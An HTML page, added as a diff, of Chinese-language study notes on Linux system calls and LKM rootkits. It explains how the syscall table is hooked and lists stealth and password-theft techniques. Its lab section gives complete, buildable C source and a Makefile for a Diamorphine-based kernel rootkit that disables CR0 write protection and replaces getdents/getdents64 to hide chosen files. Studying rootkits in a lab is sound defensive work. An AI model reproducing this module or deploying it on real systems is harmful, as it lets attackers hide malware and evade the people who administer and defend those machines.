@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title># Syscall,Syscall</title>
+    <link rel="stylesheet" href="/assets/css/notes.min.css">
+</head>
+<body>
+    <div class="main-content-wrapper">
+        <main class="content">
+            <h1>Syscall</h1>
+<h2>1.基本概念</h2>
+<p>隔离的特权： Linux 系统分为两个“空间”：</p>
+<ul>
+<li>用户空间 (User Space)：运行的普通程序（如 ls, cat, 浏览器）都在这里。它们权限很低，不能直接操作硬件（比如读写文件、发送网络包）</li>
+<li>内核空间 (Kernel Space)：操作系统核心（Kernel）运行的地方。它拥有最高权限，可以控制一切硬件</li>
+</ul>
+<p>当用户空间的程序（比如 ls）需要读取目录内容时，它不能自己去读硬盘。它必须“请求”内核帮它做。这个“请求”的动作，就是系统调用</p>
+<p>例如：ls 调用 opendir() -&gt; C 库函数 opendir() 触发 getdents64 系统调用 -&gt; 内核执行真正的 sys_getdents64 函数 -&gt; 内核把结果返回给 ls</p>
+<h2>2.系统调用管理</h2>
+<p>使用一个“总调度表”，称为 系统调用表 (System Call Table)，在内核中通常（在 x86-64 架构上）被命名为 sys_call_table。</p>
+<p>这个表本质上是一个巨大的 数组，里面存放的全是 函数指针（即内存地址）</p>
+<p>查看系统完整的 syscall：</p>
+<pre><code class="language-shell">sudo apt install linux-headers-$(uname -r)
+cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h
+</code></pre>
+<p>常用的系统调用：</p>
+<table>
+<thead>
+<tr>
+<th>systemcall</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>int sys_brk(unsigned long new_brk);</td>
+<td>changes the size of used DS (data segment)</td>
+</tr>
+<tr>
+<td>int sys_fork(struct pt_regs regs);</td>
+<td>systemcall for the well-know fork() function in user space</td>
+</tr>
+<tr>
+<td>int sys_getuid (); int sys_setuid (uid_t uid) …</td>
+<td>systemcalls for managing UID etc.</td>
+</tr>
+<tr>
+<td>int sys_get_kernel_sysms(struct kernel_sym *table)</td>
+<td>systemcall for accessing the kernel system table</td>
+</tr>
+<tr>
+<td>int sys_sethostname (char *name, int len); int sys_gethostname (char * name, int len);</td>
+<td>sys_sethostname is responsible for setting the hostname, and sys_gethostname for retrieving it</td>
+</tr>
+<tr>
+<td>int sys_chdir (const char *path); int sys_fchdir (unsigned int fd);</td>
+<td>both function are used for setting the current directory (cd …)</td>
+</tr>
+<tr>
+<td>int sys_chmod (const char *filename, mode_t mode); int sys_chown (const char * filename, mode_t mode); int sys_fchmod (unsigned int fildes, mode_t mode); int sys_fchown (unsigned int fildes, mode_t mode);</td>
+<td>functions for managing permissions and so on</td>
+</tr>
+<tr>
+<td>int sys_chroot (const char *filename);</td>
+<td>sets root directory for calling process</td>
+</tr>
+<tr>
+<td>int sys_execve (struct pt_regs regs);</td>
+<td>important systemcall -&gt; it is responsible for executing file (pt_regs is the register stack)</td>
+</tr>
+<tr>
+<td>long sys_fcntl (unsigned int fd, unsigned int cmd, unsigned long arg);</td>
+<td>changing characteristics of fd (opened file descr.)</td>
+</tr>
+<tr>
+<td>int sys_link (const char *oldname, const char * newname); int sym_link (const char *oldname, const char * newname); int sys_unlink (const char *name);</td>
+<td>systemcalls for hard- / softlinks management</td>
+</tr>
+<tr>
+<td>int sys_rename (const char *oldname, const char * newname);</td>
+<td>file renaming</td>
+</tr>
+<tr>
+<td>int sys_rmdir (const char * name); int sys_mkdir (const * char filename, int mode);</td>
+<td>creating &amp; removing directories</td>
+</tr>
+<tr>
+<td>int sys_open (const char *filename, int mode); int sys_close (unsigned int fd);</td>
+<td>everything concering opening files (also creation), and also closing them</td>
+</tr>
+<tr>
+<td>int sys_read (unsigned int fd, char *buf, unsigned int count); int sys_write (unsigned int fd, char * buf, unsigned int count);</td>
+<td>systemcalls for writing &amp; reading from Files</td>
+</tr>
+<tr>
+<td>int sys_getdents (unsigned int fd, struct dirent *dirent, unsigned int count);</td>
+<td>systemcall which retrievs file listing (ls … command)</td>
+</tr>
+<tr>
+<td>int sys_readlink (const char *path, char * buf, int bufsize);</td>
+<td>reading symbolic links</td>
+</tr>
+<tr>
+<td>int sys_selectt (int n, fd_set *inp, fd_set * outp, fd_set *exp, struct timeval * tvp);</td>
+<td>multiplexing of I/O operations</td>
+</tr>
+<tr>
+<td>sys_socketcall (int call, unsigned long args);</td>
+<td>socket functions</td>
+</tr>
+<tr>
+<td>unsigned long sys_create_module (char *name, unsigned long size); int sys_delete_module (char * name); int sys_query_module (const char *name, int which, void * buf, size_t bufsize, size_t *ret);</td>
+<td>used for loading / unloading LKMs and querying</td>
+</tr>
+</tbody>
+</table>
+<h2>3.hook 流程</h2>
+<p>hook 瞬间：</p>
+<ul>
+<li>找到 sys_call_table：在内核内存中找到这个“总调度表”的地址</li>
+<li>保存原始地址：读取 sys_call_table [217]（sys_getdents64 的地址），并把这个真正的、合法的函数地址保存在自己的一个变量里（比如 original_getdents）</li>
+<li>实施篡改：覆盖 sys_call_table [217] 的内容，把它改成 rootkit 自己的一个恶意函数的地址（比如 hacked_getdents）</li>
+</ul>
+<p>rootkit 的 hacked_getdents 函数内部：</p>
+<ul>
+<li>
+<p>恶意函数首先调用它之前保存的 original_getdents 地址</p>
+</li>
+<li>
+<p>合法的 sys_getdents64 函数被执行，它从硬盘读取了所有的目录内容（包括一个名为 evil_rootkit.ko 的恶意文件）</p>
+</li>
+<li>
+<p>合法的函数把这个完整列表返回给 rootkit 的 hacked_getdents</p>
+</li>
+<li>
+<p>hacked_getdents 拿到列表后，遍历这个列表，找到并删除了 evil_rootkit.ko 这一项</p>
+</li>
+<li>
+<p>hacked_getdents 把这个被“过滤”过的、不包含恶意文件的列表返回给用户空间的 ls 程序</p>
+</li>
+</ul>
+<h2>4.常用技战法</h2>
+<ul>
+<li>
+<p>隐藏文件 (hook <code>getdents64</code>)</p>
+</li>
+<li>
+<p>隐藏进程 (hook <code>getpriority</code> 或 <code>kill</code>)</p>
+</li>
+<li>
+<p>隐藏网络连接 (hook <code>recvmsg</code>)</p>
+</li>
+<li>
+<p>窃取密码 (hook <code>read</code> 或 <code>write</code>，专门针对 <code>ssh</code> 或 <code>login</code> 进程)</p>
+</li>
+</ul>
+<h2>5.transform Kernel to User Space Memory</h2>
+<h2>6.实验</h2>
+<p>lkmdemo_init (初始化时)：</p>
+<ul>
+<li>
+<p>找到系统调用表</p>
+</li>
+<li>
+<p>关闭内存写保护</p>
+</li>
+<li>
+<p>保存原始的 getdents 和 getdents64 系统调用地址</p>
+</li>
+<li>
+<p>将表中的地址替换为它自己的 hacked_getdents 和 hacked_getdents64 函数地址</p>
+</li>
+<li>
+<p>重新打开内存写保护。</p>
+</li>
+</ul>
+<p>lkmdemo_cleanup (卸载时)：</p>
+<ul>
+<li>
+<p>关闭内存写保护</p>
+</li>
+<li>
+<p>将它自己的恶意函数地址从表中移除，恢复原始的系统调用地址</p>
+</li>
+<li>
+<p>重新打开内存写保护</p>
+</li>
+</ul>
+<p>make 后运行流程：</p>
+<ul>
+<li>加载内核模块: insmod lkmdemo.ko</li>
+<li>运行 ls, 会看到 malicious_file 从输出中隐藏了</li>
+<li>运行 lsmod, 在输出中看到 lkmdem</li>
+<li>卸载模块: rmmod lkmdemo</li>
+</ul>
+<p>现代 Linux 内核中（2.6 版本以后）：sys_call_table 不再被“导出” (Exported)：LKM 不能再像 printk 那样直接按名字使用它。Rootkit 必须通过扫描内核内存（比如 kallsyms）来“猜”它的位置。</p>
+<p>写保护 (Write Protection)：sys_call_table 所在的内存页通常被标记为只读。</p>
+<p>现代 LKM rootkit 在执行实施篡改之前，还必须先绕过这个写保护。它们通常通过修改 CPU 的一个特定控制寄存器（<code>CR0</code>）来暂时关闭内核内存的写保护，修改完后再迅速打开。</p>
+<pre><code class="language-c">#include &lt;linux/sched.h&gt;
+#include &lt;linux/module.h&gt;
+#include &lt;linux/syscalls.h&gt;
+#include &lt;linux/dirent.h&gt;
+#include &lt;linux/slab.h&gt;
+#include &lt;linux/version.h&gt; 
+#include &lt;linux/proc_ns.h&gt;
+#include &lt;linux/fdtable.h&gt;
+#ifndef __NR_getdents
+#define __NR_getdents 141
+#endif
+#define MAGIC_PREFIX &quot;malicious_file&quot;
+#define MODULE_NAME &quot;lkmdemo&quot;
+
+struct linux_dirent {
+        unsigned long   d_ino;
+        unsigned long   d_off;
+        unsigned short  d_reclen;
+        char            d_name[1];
+};
+
+unsigned long cr0;
+static unsigned long *__sys_call_table;
+typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
+static t_syscall orig_getdents;
+static t_syscall orig_getdents64;
+
+// 在内核的所有符号（函数和变量）中按名称搜索并返回其内存地址
+unsigned long * get_syscall_table_bf(void)
+{
+  unsigned long *syscall_table;
+  syscall_table = (unsigned long*)kallsyms_lookup_name(&quot;sys_call_table&quot;);
+  return syscall_table;
+}
+
+// 过滤目录内容
+static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
+  struct linux_dirent * dirent = (struct linux_dirent *) pt_regs-&gt;si;
+  // 调用原始函数
+  int ret = orig_getdents64(pt_regs), err;
+  unsigned long off = 0;
+  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+  if (ret &lt;= 0)
+    return ret;
+  // 复制到内核空间
+  kdirent = kzalloc(ret, GFP_KERNEL);
+  if (kdirent == NULL)
+    return ret;
+  err = copy_from_user(kdirent, dirent, ret);
+  if (err)
+    goto out;
+  // 遍历和过滤
+  while (off &lt; ret) {
+    dir = (void *)kdirent + off;
+    if (memcmp(MAGIC_PREFIX, dir-&gt;d_name, strlen(MAGIC_PREFIX)) == 0) {
+      if (dir == kdirent) {
+        ret -= dir-&gt;d_reclen;
+        memmove(dir, (void *)dir + dir-&gt;d_reclen, ret);
+        continue;
+      }
+      // 将前一个（合法的）文件的“记录长度”(d_reclen) 字段扩大，使其“吞并”当前这个恶意文件的空间
+      prev-&gt;d_reclen += dir-&gt;d_reclen;
+    } else
+      prev = dir;
+    off += dir-&gt;d_reclen;
+  }
+  // 复制返回用户空间
+  err = copy_to_user(dirent, kdirent, ret);
+  if (err)
+    goto out;
+out:
+  kfree(kdirent);
+  return ret;
+}
+
+static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
+  struct linux_dirent * dirent = (struct linux_dirent *) pt_regs-&gt;si;
+  int ret = orig_getdents(pt_regs), err;
+  unsigned long off = 0;
+  struct linux_dirent *dir, *kdirent, *prev = NULL;
+  if (ret &lt;= 0)
+    return ret;	
+  kdirent = kzalloc(ret, GFP_KERNEL);
+  if (kdirent == NULL)
+    return ret;
+  err = copy_from_user(kdirent, dirent, ret);
+  if (err)
+    goto out;
+  while (off &lt; ret) {
+    dir = (void *)kdirent + off;
+    if (memcmp(MAGIC_PREFIX, dir-&gt;d_name, strlen(MAGIC_PREFIX)) == 0) {
+      if (dir == kdirent) {
+        ret -= dir-&gt;d_reclen;
+        memmove(dir, (void *)dir + dir-&gt;d_reclen, ret);
+        continue;
+      }
+      prev-&gt;d_reclen += dir-&gt;d_reclen;
+    } else
+      prev = dir;
+    off += dir-&gt;d_reclen;
+  }
+  err = copy_to_user(dirent, kdirent, ret);
+  if (err)
+    goto out;
+out:
+  kfree(kdirent);
+  return ret;
+}
+
+static inline void write_cr0_forced(unsigned long val)
+{
+  unsigned long __force_order;
+  asm volatile(
+    &quot;mov %0, %%cr0&quot;
+    : &quot;+r&quot;(val), &quot;+m&quot;(__force_order));
+}
+
+static inline void protect_memory(void)
+{
+  write_cr0_forced(cr0);
+}
+static inline void unprotect_memory(void)
+{
+  write_cr0_forced(cr0 &amp; ~0x00010000);
+}
+
+static int __init lkmdemo_init(void)
+{
+  __sys_call_table = get_syscall_table_bf();
+  if (!__sys_call_table)
+    return -1;
+  cr0 = read_cr0();
+  orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
+  orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
+  unprotect_memory();
+  __sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
+  __sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
+  protect_memory();
+  return 0;
+}
+
+static void __exit lkmdemo_cleanup(void)
+{
+  unprotect_memory();
+  __sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
+  __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
+  protect_memory();
+}
+
+module_init(lkmdemo_init);
+module_exit(lkmdemo_cleanup);
+
+MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);
+MODULE_AUTHOR(&quot;demo&quot;);
+MODULE_DESCRIPTION(&quot;LKM rootkit based on diamorphine&quot;);
+</code></pre>
+<pre><code class="language-makefile">obj-m := lkmdemo.o
+CC = gcc -Wall 
+KDIR := /lib/modules/$(shell uname -r)/build
+PWD := $(shell pwd)
+
+all:
+	$(MAKE) -C $(KDIR) M=$(PWD) modules
+
+clean:
+	$(MAKE) -C $(KDIR) M=$(PWD) clean
+</code></pre>
+<p>在 Linux 内核版本 2.6.33 到 5.7.0 之间，kallsyms_lookup_name 被导出，可以直接使用。但是，在内核版本 5.7 之后，这个函数不再被导出</p>
+
+        </main>
+    </div>
+</body>
+</html>
